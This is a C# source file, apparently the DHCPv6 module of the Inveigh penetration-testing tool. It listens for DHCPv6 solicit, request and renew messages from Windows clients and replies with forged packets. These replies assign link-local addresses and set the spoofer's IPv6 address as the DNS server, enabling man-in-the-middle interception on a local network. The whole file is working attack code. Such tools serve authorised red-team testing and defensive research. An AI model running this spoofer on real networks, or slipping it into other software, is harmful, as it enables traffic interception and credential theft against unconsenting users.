using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace Inveigh
{
    class DHCPv6
    {
        public static void DHCPv6Listener(string ipv6, string spooferIPv6, string snifferMAC, string dhcpv6DomainSuffix)
        {
            byte[] spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
            IPAddress destinationIPAddress = IPAddress.Parse(ipv6);
            IPEndPoint dhcpv6Endpoint = new IPEndPoint(IPAddress.Parse(ipv6), 547);
            //UdpClient dhcpv6Client = new UdpClient(AddressFamily.InterNetworkV6);
            int dhcpv6IPIndex = 1;
            byte[] dhcpv6DomainSuffixData = Util.NewDNSNameArray(dhcpv6DomainSuffix, true);
            Random ipv6Random = new Random();
            int ipv6RandomValue = ipv6Random.Next(1, 9999);
            byte[] snifferMACArray = new byte[6];
            snifferMAC = snifferMAC.Insert(2, "-").Insert(5, "-").Insert(8, "-").Insert(11, "-").Insert(14, "-");
            int i = 0;

            foreach (string character in snifferMAC.Split('-'))
            {
                snifferMACArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                i++;
            }

            UdpClient dhcpv6Client = UDP.UDPListener("DHCPv6", ipv6, 547, "IPv6");

            while (!Program.exitInveigh)
            {

                try
                {
                    byte[] udpPayload = dhcpv6Client.Receive(ref dhcpv6Endpoint);
                    int dhcpv6SourcePort = dhcpv6Endpoint.Port;
                    IPAddress sourceIPAddress = dhcpv6Endpoint.Address;
                    byte[] dhcpv6MessageTypeID = new byte[1];
                    Buffer.BlockCopy(udpPayload, 0, dhcpv6MessageTypeID, 0, 1);
                    byte[] dhcpv6TransactionID = new byte[3];
                    Buffer.BlockCopy(udpPayload, 1, dhcpv6TransactionID, 0, 3);
                    byte[] dhcpv6ClientIdentifier = new byte[18];
                    Buffer.BlockCopy(udpPayload, 10, dhcpv6ClientIdentifier, 0, 18);
                    byte[] dhcpv6ClientMACData = new byte[6];
                    Buffer.BlockCopy(udpPayload, 22, dhcpv6ClientMACData, 0, 6);
                    string dhcpv6ClientMAC = BitConverter.ToString(dhcpv6ClientMACData).Replace("-", ":");
                    byte[] dhcpv6IAID = new byte[4];

                    if ((int)dhcpv6MessageTypeID[0] == 1)
                    {
                        Buffer.BlockCopy(udpPayload, 32, dhcpv6IAID, 0, 4);
                    }
                    else
                    {
                        Buffer.BlockCopy(udpPayload, 46, dhcpv6IAID, 0, 4);
                    }

                    byte[] dhcpv6ClientIP = new byte[16];
                    string dhcpv6LeaseIP = "";
                    byte[] dhcpv6OptionData = new byte[2];
                    byte[] dhcpv6OptionLength = new byte[2];
                    string dhcpv6FQDN = "";

                    if ((int)dhcpv6MessageTypeID[0] == 1 || (int)dhcpv6MessageTypeID[0] == 3 || (int)dhcpv6MessageTypeID[0] == 5)
                    {

                        for (i = 12; i < udpPayload.Length; i++)
                        {

                            if (Util.UInt16DataLength(i, udpPayload) == 39)
                            {
                                dhcpv6FQDN = Util.ParseNameQuery((i + 4), udpPayload);
                            }

                        }

                        int index = BitConverter.ToString(udpPayload).Replace("-", String.Empty).IndexOf("4D53465420352E30");

                        if (index >= 0 && Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
                        {
                            dhcpv6LeaseIP = Program.dhcpv6ClientTable[dhcpv6ClientMAC].ToString();
                            dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                        }
                        else if (index >= 0 && !Program.dhcpv6ClientTable.ContainsKey(dhcpv6ClientMAC))
                        {
                            dhcpv6LeaseIP = "fe80::" + ipv6RandomValue + ":" + dhcpv6IPIndex;
                            dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                            Program.dhcpv6ClientTable.Add(dhcpv6ClientMAC, dhcpv6LeaseIP);
                            dhcpv6IPIndex++;

                            lock (Program.dhcpv6FileList)
                            {
                                Program.dhcpv6FileList.Add(dhcpv6ClientMAC + "," + dhcpv6LeaseIP);
                            }

                        }

                        if (Program.enabledDHCPv6)
                        {

                            if (index > 0)
                            {
                                byte[] dhcpv6Response = DHCPv6.GetDHCPv6Response("listener", dhcpv6DomainSuffix, sourceIPAddress, destinationIPAddress, dhcpv6ClientIP, spooferIPv6Data, snifferMACArray, Util.IntToByteArray2(546), udpPayload);
                                IPEndPoint dnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, 546);
                                UDP.UDPListenerClient(sourceIPAddress, dhcpv6SourcePort, dhcpv6Client, dhcpv6Response);
                                //dnsEndpoint = new IPEndPoint(dnsListenerIP, 53);
                                dhcpv6Client = UDP.UDPListener("DHCPv6", ipv6, 547, "IPv6");
                            }

                        }

                        DHCPv6Output(dhcpv6ClientMAC, dhcpv6FQDN, dhcpv6LeaseIP, sourceIPAddress.ToString(), index, (int)dhcpv6MessageTypeID[0]);
                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] DHCPv6 spoofer error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static byte[] GetDHCPv6Response(string type, string domainSuffix, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] clientIP, byte[] spooferIPv6Data, byte[] snifferMACArray, byte[] udpSourcePort, byte[] udpPayload)
        {
            byte[] domainSuffixData = Util.NewDNSNameArray(domainSuffix, true);
            byte[] messageTypeID = new byte[1];
            Buffer.BlockCopy(udpPayload, 0, messageTypeID, 0, 1);
            byte[] transactionID = new byte[3];
            Buffer.BlockCopy(udpPayload, 1, transactionID, 0, 3);
            byte[] clientIdentifier = new byte[18];
            Buffer.BlockCopy(udpPayload, 10, clientIdentifier, 0, 18);
            byte[] clientMACData = new byte[6];
            Buffer.BlockCopy(udpPayload, 22, clientMACData, 0, 6);
            string clientMAC = BitConverter.ToString(clientMACData).Replace("-", ":");
            byte[] iAID = new byte[4];

            if ((int)messageTypeID[0] == 1)
            {
                Buffer.BlockCopy(udpPayload, 32, iAID, 0, 4);
            }
            else
            {
                Buffer.BlockCopy(udpPayload, 46, iAID, 0, 4);
            }

            MemoryStream dhcpv6MemoryStream = new MemoryStream();

            if (String.Equals(type, "sniffer"))
            {
                dhcpv6MemoryStream.Write((new byte[2] { 0x02, 0x23 }), 0, 2);
                dhcpv6MemoryStream.Write((new byte[2] { 0x02, 0x22 }), 0, 2);
                dhcpv6MemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
                dhcpv6MemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
            }

            if ((int)messageTypeID[0] == 1)
            {
                dhcpv6MemoryStream.Write((new byte[1] { 0x02 }), 0, 1);
            }
            else if ((int)messageTypeID[0] == 3)
            {
                dhcpv6MemoryStream.Write((new byte[1] { 0x07 }), 0, 1);
            }
            else if ((int)messageTypeID[0] == 5)
            {
                dhcpv6MemoryStream.Write((new byte[1] { 0x07 }), 0, 1);
            }

            dhcpv6MemoryStream.Write(transactionID, 0, transactionID.Length);
            dhcpv6MemoryStream.Write(clientIdentifier, 0, clientIdentifier.Length);
            dhcpv6MemoryStream.Write((new byte[4] { 0x00, 0x02, 0x00, 0x0a }), 0, 4);
            dhcpv6MemoryStream.Write((new byte[4] { 0x00, 0x03, 0x00, 0x01 }), 0, 4);
            dhcpv6MemoryStream.Write(snifferMACArray, 0, snifferMACArray.Length);
            dhcpv6MemoryStream.Write((new byte[4] { 0x00, 0x17, 0x00, 0x10 }), 0, 4);
            dhcpv6MemoryStream.Write(spooferIPv6Data, 0, spooferIPv6Data.Length);

            if (!String.IsNullOrEmpty(domainSuffix))
            {
                dhcpv6MemoryStream.Write((new byte[2] { 0x00, 0x18 }), 0, 2);
                dhcpv6MemoryStream.Write(Util.IntToByteArray2(domainSuffixData.Length), 0, 2);
                dhcpv6MemoryStream.Write(domainSuffixData, 0, domainSuffixData.Length);
            }

            dhcpv6MemoryStream.Write((new byte[4] { 0x00, 0x03, 0x00, 0x28 }), 0, 4);
            dhcpv6MemoryStream.Write(iAID, 0, iAID.Length);
            dhcpv6MemoryStream.Write((new byte[12] { 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfa, 0x00, 0x05, 0x00, 0x18 }), 0, 12);
            dhcpv6MemoryStream.Write(clientIP, 0, clientIP.Length);
            dhcpv6MemoryStream.Write((new byte[8] { 0x00, 0x00, 0x01, 0x2c, 0x00, 0x00, 0x01, 0x2c }), 0, 8);

            if (String.Equals(type, "sniffer"))
            {
                dhcpv6MemoryStream.Position = 4;
                dhcpv6MemoryStream.Write(Util.IntToByteArray2((int)dhcpv6MemoryStream.Length), 0, 2);
                byte[] pseudoHeader = Util.GetIPv6PseudoHeader(destinationIPAddress, sourceIPAddress, 17, (int)dhcpv6MemoryStream.Length);
                UInt16 checkSum = Util.GetPacketChecksum(pseudoHeader, dhcpv6MemoryStream.ToArray());
                dhcpv6MemoryStream.Position = 6;
                byte[] packetChecksum = Util.IntToByteArray2(checkSum);
                Array.Reverse(packetChecksum);
                dhcpv6MemoryStream.Write(packetChecksum, 0, 2);
            }

            return dhcpv6MemoryStream.ToArray();
        }

        public static string DHCPv6Output(string dhcpv6ClientMAC, string dhcpv6FQDN, string dhcpv6LeaseIP, string sourceIPAddress, int index, int messageTypeID)
        {
            string dhcpv6MessageType = "";
            string dhcpv6ResponseMessage = "";
            string dhcpv6ResponseMessage2 = "";

            if (Program.argSpooferMACsIgnore != null && Program.argSpooferMACsIgnore.Length > 0 && (Array.Exists(Program.argSpooferMACsIgnore, element => element == dhcpv6ClientMAC.Replace(":",""))))
            {
                dhcpv6ResponseMessage = String.Concat(dhcpv6ClientMAC, " is on ignore list");
            }
            else if (Program.argSpooferMACsReply != null && Program.argSpooferMACsReply.Length > 0 && (!Array.Exists(Program.argSpooferMACsReply, element => element == dhcpv6ClientMAC.Replace(":", ""))))
            {
                dhcpv6ResponseMessage = String.Concat(dhcpv6ClientMAC, " not on reply list");
            }
            else if (!Program.enabledDHCPv6 && messageTypeID == 1)
            {
                dhcpv6ResponseMessage = "spoofer disabled";
            }
            else if (index < 0)
            {
                dhcpv6ResponseMessage = "vendor ignored";
            }
            else if (messageTypeID == 1)
            {
                dhcpv6ResponseMessage = "response sent";         
            }
            else if (messageTypeID == 3)
            {            
                dhcpv6ResponseMessage = "response sent";   
            }
            else if (messageTypeID == 5)
            {
                dhcpv6ResponseMessage = "response sent";
            }

            switch (messageTypeID)
            {

                case 1:
                    dhcpv6MessageType = "solicitation";
                    dhcpv6ResponseMessage2 = "advertised";
                    break;

                case 3:
                    dhcpv6MessageType = "request";
                    dhcpv6ResponseMessage2 = "leased";
                    break;

                case 5:
                    dhcpv6MessageType = "renew";
                    dhcpv6ResponseMessage2 = "renewed";
                    break;

            }

            lock (Program.outputList)
            {

                if (!String.IsNullOrEmpty(dhcpv6FQDN))
                {
                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2}({3}) [{4}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6FQDN, dhcpv6ResponseMessage));
                }
                else
                {
                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} from {2} [{3}]", DateTime.Now.ToString("s"), dhcpv6MessageType, sourceIPAddress, dhcpv6ResponseMessage));
                }

                if (String.Equals(dhcpv6ResponseMessage, "response sent"))
                {
                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 {1} {2} to {3}", DateTime.Now.ToString("s"), dhcpv6LeaseIP, dhcpv6ResponseMessage2, dhcpv6ClientMAC));
                }
                else if (!dhcpv6ResponseMessage.EndsWith(" list"))
                {
                    Program.outputList.Add(String.Format("[+] [{0}] DHCPv6 client MAC {3}", DateTime.Now.ToString("s"), dhcpv6LeaseIP, dhcpv6ResponseMessage2, dhcpv6ClientMAC));
                }

            }

            return dhcpv6ResponseMessage;
        }

    }

}
